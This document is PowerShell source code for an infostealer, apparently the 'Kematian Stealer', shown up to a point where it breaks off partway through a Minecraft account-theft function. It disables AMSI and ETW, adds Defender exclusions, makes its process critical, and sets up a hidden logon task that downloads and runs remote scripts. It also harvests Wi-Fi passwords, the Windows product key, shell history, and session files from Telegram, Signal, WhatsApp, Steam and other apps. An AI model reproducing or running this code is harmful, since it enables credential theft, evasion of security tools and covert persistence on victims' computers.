$webhook = "YOUR_WEBHOOK_HERE" 
$debug = $false
$blockhostsfile = $true
$criticalprocess = $true
$melt = $false
$fakeerror = $false
$persistence = $true

if ($debug) {
    $ProgressPreference = 'Continue'
}
else {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
}

$avatar = "https://i.imgur.com/DOIYOtp.gif"


# Load WPF assemblies
Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing

function KDMUTEX {
    if ($fakeerror) {
        [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
    }
    $AppId = "f8f13feb-1149-4dd5-bed5-5bcf4efc2f9b"
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if (-not $CreatedNew) {
        throw "[!] An instance of this script is already running."
    }
    elseif ($criticalprocess -and -not $debug) {
        [ProcessUtility]::MakeProcessCritical()
    }
    Invoke-TASKS
}


#THIS CODE WAS MADE BY EvilByteCode
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class ProcessUtility
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

    public static void MakeProcessCritical()
    {
        Process.EnterDebugMode();
        RtlSetProcessIsCritical(1, 0, 0);
    }

    public static void MakeProcessKillable()
    {
        RtlSetProcessIsCritical(0, 0, 0);
    }
}
"@
#END OF CODE MADE BY EvilByteCode

# Request admin with AMSI bypass and ETW Disable
function CHECK_AND_PATCH {
    ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
    ([Reflection.Assembly]::LoadWithPartialName(('System.Core')).GetType(('System.Diagnostics.Eventing.EventProvider')).GetField(('m_enabled'), ('NonPublic,Instance')).SetValue([Ref].Assembly.GetType(('System.Management.Automation.Tracing.PSEtwLogProvider')).GetField(('etwProvider'), ('NonPublic,Static')).GetValue($null), 0))
    $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $kematiancheck
}


function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
    if ($persistence) {
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
        Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
        $KDOT_DIR = New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
        $KDOT_DIR.Attributes = "Hidden", "System"
        $task_name = "Kematian"
        $task_action = if ($debug) {
            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
        }
        else {
            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
        }
        $task_trigger = New-ScheduledTaskTrigger -AtLogOn
        $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force | Out-Null
        Write-Host "[!] Persistence Added" -ForegroundColor Green
    }
    if ($blockhostsfile) {
        $link = "https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
        iex (iwr -Uri $link -UseBasicParsing)
    }
    Backup-Data
}

function VMPROTECT {
    $link = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
    iex (iwr -uri $link -useb)
    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
}


function Request-Admin {
    while (-not (CHECK_AND_PATCH)) {
        if ($PSCommandPath -eq $null) {
            Write-Host "Please run the script with admin!" -ForegroundColor Red
            Start-Sleep -Seconds 5
            Exit 1
        }
        if ($debug -eq $true) {
            try { Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
        }
        else {
            try { Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
        } 
    }    
}

function Backup-Data {
    
    Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    $timezone = Get-TimeZone
    $offsetHours = $timezone.BaseUtcOffset.Hours
    $timezoneString = "UTC$offsetHours"
    $filedate = Get-Date -Format "yyyy-MM-dd"
    $cc = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
    $countrycode = ($cc -split "`n" | ? { $_ -match '^loc=(.*)$' } | % { $Matches[1] })
    $folderformat = "$env:APPDATA\Kematian\$countrycode-($hostname)-($filedate)-($timezoneString)"

    $folder_general = $folderformat
    $folder_messaging = "$folderformat\Messaging Sessions"
    $folder_gaming = "$folderformat\Gaming Sessions"
    $folder_crypto = "$folderformat\Crypto Wallets"
    $folder_vpn = "$folderformat\VPN Clients"
    $folder_email = "$folderformat\Email Clients"
    $important_files = "$folderformat\Important Files"
    $browser_data = "$folderformat\Browser Data"
    $ftp_clients = "$folderformat\FTP Clients"
    $password_managers = "$folderformat\Password Managers" 

    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients)
    foreach ($folder in $folders) { if (Test-Path $folder) { Remove-Item $folder -Recurse -Force } }
    $folders | ForEach-Object {
        New-Item -ItemType Directory -Path $_ -Force | Out-Null
    }
    Write-Host "[!] Backup Directories Created" -ForegroundColor Green
	
    #bulk data (added build ID with banner)
    function Get-Network {
        $resp = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
        $ip = [regex]::Match($resp, 'ip=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)').Groups[1].Value
        $url = "http://ip-api.com/json"
        $hosting = (Invoke-WebRequest -Uri "http://ip-api.com/line/?fields=hosting" -useb).Content
        $response = Invoke-RestMethod -Uri $url -Method Get
        if (-not $response) {
            return "Not Found"
        }
        $country = $response.country
        $regionName = $response.regionName
        $city = $response.city
        $zip = $response.zip
        $lat = $response.lat
        $lon = $response.lon
        $isp = $response.isp
        return "IP: $ip `nCountry: $country `nRegion: $regionName `nCity: $city `nISP: $isp `nLatitude: $lat `nLongitude: $lon `nZip: $zip `nVPN/Proxy: $hosting"
    }

    $networkinfo = Get-Network
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = Get-Date -Format "r"
    $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
    $windowsVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    $buildNumber = $windowsVersion.CurrentBuild; $ubR = $windowsVersion.UBR; $osbuild = "$buildNumber.$ubR" 
    $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
    $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
    $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
    $CPU = (Get-CimInstance -ClassName Win32_Processor).Name
    $corecount = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
    $GPU = (Get-CimInstance -ClassName Win32_VideoController).Name
    $total = (Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
    $raminfo = "{0:N2} GB" -f $total
    $mac = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress -join ","
    
    # A cool banner 
    $guid = [Guid]::NewGuid()
    $guidString = $guid.ToString()
    $suffix = $guidString.Substring(0, 8)  
    $prefixedGuid = "Kematian-Stealer-" + $suffix
    $kematian_banner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZHilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilZcgICDilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDilZENCuKVkeKWiOKWiOKVkSDilojilojilZTilZ3ilojilojilZTilZDilZDilZDilZDilZ3ilojilojilojilojilZcg4paI4paI4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWXICDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilZENCuKVkeKWiOKWiOKWiOKWiOKWiOKVlOKVnSDilojilojilojilojilojilZcgIOKWiOKWiOKVlOKWiOKWiOKWiOKWiOKVlOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWXICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilojilZHilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWU4pWd4pWRDQrilZHilojilojilZTilZDilojilojilZcg4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZHilZrilojilojilZTilZ3ilojilojilZHilojilojilZTilZDilZDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZHilZrilojilojilZfilojilojilZEgICAg4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZTilZDilZDilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWRDQrilZHilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSDilZrilZDilZ0g4paI4paI4pWR4paI4paI4pWRICDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkeKVkQ0K4pWR4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVkOKVkOKVnSAgICDilZrilZDilZDilZDilZDilZDilZDilZ0gICDilZrilZDilZ0gICDilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWRDQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHR0cHM6Ly9naXRodWIuY29tL1NvbWFsaS1EZXZzL0tlbWF0aWFuLVN0ZWFsZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQ0K4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd")
    $kematian_strings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($kematian_banner))
    $kematian_info = "$kematian_strings `nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
    
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime

    function Get-InstalledAV {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery
        $AntivirusProduct.displayName
    }
    $avlist = Get-InstalledAV | Format-Table | Out-String
    
    $screen = wmic path Win32_VideoController get VideoModeDescription /format:csv | Select-String -Pattern "\d{3,4} x \d{3,4}" | ForEach-Object { $_.Matches.Value }

    $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Format-Table -Wrap -AutoSize |
    Out-String

    $network = Get-NetAdapter |
    Select-Object Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium |
    Out-String

    $startupapps = Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User |
    Format-List |
    Out-String

    $runningapps = Get-WmiObject Win32_Process |
    Select-Object Name, Description, ProcessId, ThreadCount, Handles |
    Format-Table -Wrap -AutoSize |
    Out-String

    $services = Get-WmiObject Win32_Service |
    Where-Object State -eq "Running" |
    Select-Object Name, DisplayName |
    Sort-Object Name |
    Format-Table -Wrap -AutoSize |
    Out-String
    
    function diskdata {
        $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
        $results = foreach ($disk in $disks) {
            try {
                $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
                $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
                $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
                $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
                $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
            }
            catch {
                $SizeOfDisk = 0
                $FreeSpace = 0
                $FreePercent = 0
                $usedspace = 0
                $usedpercent = 0
            }

            [PSCustomObject]@{
                Drive             = $disk.Name
                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
            }
        }
        $results | Where-Object { $_.PSObject.Properties.Value -notcontains '' }
    }
    $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
    $alldiskinfo = $alldiskinfo.Trim()

    $info = "$kematian_info`n`n[Network] `n$networkinfo `n[Disk Info] `n$alldiskinfo `n`n[System] `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network Adapters] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
    $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8

    Function Get-WiFiInfo {
        $wifidir = "$env:tmp"
        New-Item -Path "$wifidir\wifi" -ItemType Directory -Force | Out-Null
        netsh wlan export profile folder="$wifidir\wifi" key=clear | Out-Null
        $xmlFiles = Get-ChildItem "$wifidir\wifi\*.xml"
        if ($xmlFiles.Count -eq 0) {
            return $false
        }
        $wifiInfo = @()
        foreach ($file in $xmlFiles) {
            [xml]$xmlContent = Get-Content $file.FullName
            $wifiName = $xmlContent.WLANProfile.SSIDConfig.SSID.name
            $wifiPassword = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
            $wifiAuth = $xmlContent.WLANProfile.MSM.security.authEncryption.authentication
            $wifiInfo += [PSCustomObject]@{
                SSID     = $wifiName
                Password = $wifiPassword
                Auth     = $wifiAuth
            }
        }
        $wifiInfo | Format-Table -AutoSize | Out-String
        $wifiInfo | Out-File -FilePath "$folder_general\WIFIPasswords.txt" -Encoding UTF8
    }
    $wifipasswords = Get-WiFiInfo 
    ri "$env:tmp\wifi" -Recurse -Force

    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        }
        catch {
            return "No product key found"
        }
    }
    Get-ProductKey > $folder_general\productkey.txt

    Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8 

    # All Messaging Sessions
    
    # Telegram 
    Write-Host "[!] Session Grabbing Started" -ForegroundColor Green
    function telegramstealer {
        $processname = "telegram"
        $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        if (!(Test-Path $pathtele)) { return }
        $telegramProcess = Get-Process -Name $processname -ErrorAction SilentlyContinue
        if ($telegramProcess) {
            $telegramPID = $telegramProcess.Id; $telegramPath = (gwmi Win32_Process -Filter "ProcessId = $telegramPID").CommandLine.split('"')[1]
            Stop-Process -Id $telegramPID -Force
        }
        $telegramsession = Join-Path $folder_messaging "Telegram"
        New-Item -ItemType Directory -Force -Path $telegramsession | Out-Null
        $items = Get-ChildItem -Path $pathtele
        foreach ($item in $items) {
            if ($item.GetType() -eq [System.IO.FileInfo]) {
                if (($item.Name.EndsWith("s") -and $item.Length -lt 200KB) -or
    ($item.Name.StartsWith("key_data") -or $item.Name.StartsWith("settings") -or $item.Name.StartsWith("configs") -or $item.Name.StartsWith("maps"))) {
                    Copy-Item -Path $item.FullName -Destination $telegramsession -Force 
                }
            }
            elseif ($item.GetType() -eq [System.IO.DirectoryInfo]) {
                if ($item.Name.Length -eq 16) {
                    $files = Get-ChildItem -Path $item.FullName -File             
                    foreach ($file in $files) {
                        if ($file.Name.EndsWith("s") -and $file.Length -lt 200KB) {
                            $destinationDirectory = Join-Path -Path $telegramsession -ChildPath $item.Name
                            if (-not (Test-Path -Path $destinationDirectory -PathType Container)) {
                                New-Item -ItemType Directory -Path $destinationDirectory | Out-Null 
                            }
                            Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force 
                        }
                    }
                }
            }
        }
        try { (Start-Process -FilePath $telegramPath) } catch {}   
    }
    telegramstealer


    # Element  
    function elementstealer {
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        if (!(Test-Path $elementfolder)) { return }
        $element_session = "$folder_messaging\Element"
        New-Item -ItemType Directory -Force -Path $element_session | Out-Null
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
    }
    elementstealer


    # ICQ  
    function icqstealer {
        $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
        if (!(Test-Path $icqfolder)) { return }
        $icq_session = "$folder_messaging\ICQ"
        New-Item -ItemType Directory -Force -Path $icq_session | Out-Null
        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
    }
    icqstealer


    # Signal  
    function signalstealer {
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        if (!(Test-Path $signalfolder)) { return }
        $signal_session = "$folder_messaging\Signal"
        New-Item -ItemType Directory -Force -Path $signal_session | Out-Null
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\attachments.noindex" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
    } 
    signalstealer


    # Viber  
    function viberstealer {
        $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
        if (!(Test-Path $viberfolder)) { return }
        $viber_session = "$folder_messaging\Viber"
        New-Item -ItemType Directory -Force -Path $viber_session | Out-Null
        $pattern = "^([\+|0-9][0-9.]{1,12})$"
        $directories = Get-ChildItem -Path $viberfolder -Directory | Where-Object { $_.Name -match $pattern }
        $rootFiles = Get-ChildItem -Path $viberfolder -File | Where-Object { $_.Name -match "(?i)\.db$|\.db-wal$" }
        foreach ($rootFile in $rootFiles) { Copy-Item -Path $rootFile.FullName -Destination $viber_session -Force }    
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Force        
            $files = Get-ChildItem -Path $directory.FullName -File -Recurse -Include "*.db", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
            foreach ($file in $files) {
                $destinationPathFiles = Join-Path -Path $destinationPath -ChildPath $file.Name
                Copy-Item -Path $file.FullName -Destination $destinationPathFiles -Force
            }
        }
    }
    viberstealer


    # Whatsapp  
    function whatsappstealer {
        $whatsapp_session = "$folder_messaging\Whatsapp"
        New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
        $regexPattern = "^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$"
        $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
        if ($parentFolder) {
            $localStateFolders = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
            foreach ($localStateFolder in $localStateFolders) {
                $profilePicturesFolder = Get-ChildItem -Path $localStateFolder.FullName -Filter "profilePictures" -Recurse -Directory
                if ($profilePicturesFolder) {
                    $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                    $profilePicturesDestination = Join-Path -Path $destinationPath -ChildPath "profilePictures"
                    Copy-Item -Path $profilePicturesFolder.FullName -Destination $profilePicturesDestination -Recurse -ErrorAction SilentlyContinue
                }
            }
            foreach ($localStateFolder in $localStateFolders) {
                $filesToCopy = Get-ChildItem -Path $localStateFolder.FullName -File | Where-Object { $_.Length -le 10MB -and $_.Name -match "(?i)\.db$|\.db-wal|\.dat$" }
                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                Copy-Item -Path $filesToCopy.FullName -Destination $destinationPath -Recurse 
            }
        }
    }
    whatsappstealer

    # Skype 
    function skype_stealer {
        $skypefolder = "$env:appdata\microsoft\skype for desktop"
        if (!(Test-Path $skypefolder)) { return }
        $skype_session = "$folder_messaging\Skype"
        New-Item -ItemType Directory -Force -Path $skype_session | Out-Null
        Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
    }
    skype_stealer
    
    
    # Pidgin 
    function pidgin_stealer {
        $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
        if (!(Test-Path $pidgin_folder)) { return }
        $pidgin_accounts = "$folder_messaging\Pidgin"
        New-Item -ItemType Directory -Force -Path $pidgin_accounts | Out-Null
        Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
    }
    pidgin_stealer
    
    # Tox 
    function tox_stealer {
        $tox_folder = "$env:appdata\Tox"
        if (!(Test-Path $tox_folder)) { return }
        $tox_session = "$folder_messaging\Tox"
        New-Item -ItemType Directory -Force -Path $tox_session | Out-Null
        Get-ChildItem -Path "$tox_folder" |  Copy-Item -Destination $tox_session -Recurse -Force
    }
    tox_stealer

    # All Gaming Sessions
    
    # Steam 
    function steamstealer {
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        if (!(Test-Path $steamfolder)) { return }
        $steam_session = "$folder_gaming\Steam"
        New-Item -ItemType Directory -Force -Path $steam_session | Out-Null
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach ($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
    }
    steamstealer


    # Minecraft 
    function minecraftstealer {
        $minecraft_session = "$folder_gaming\Minecraft"
        New-Item -ItemType Directory -Force -Path $minecraft_session | Out-Null
        $minecraft_paths = @{
            "Minecraft" = @{
                "Intent"          = Join-Path $env:userprofile "intentlauncher\launcherconfig"
                "Lunar"           = Join-Path $env:userprofile ".lunarclient\settings\game\accounts.json"
                "TLauncher"       = Join-Path $env:userprofile "AppData\Roaming\.minecraft\TlauncherProfiles.json"
                "Feather"         = Join-Path $env:userprofile "AppData\Roaming\.feather\accounts.json"
                "Meteor"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\meteor-client\accounts.nbt"
                "Impact"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Impact\alts.json"
                "Novoline"        = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Novoline\alts.novo"
                "CheatBreakers"   = Join-Path $env:userprofile "AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
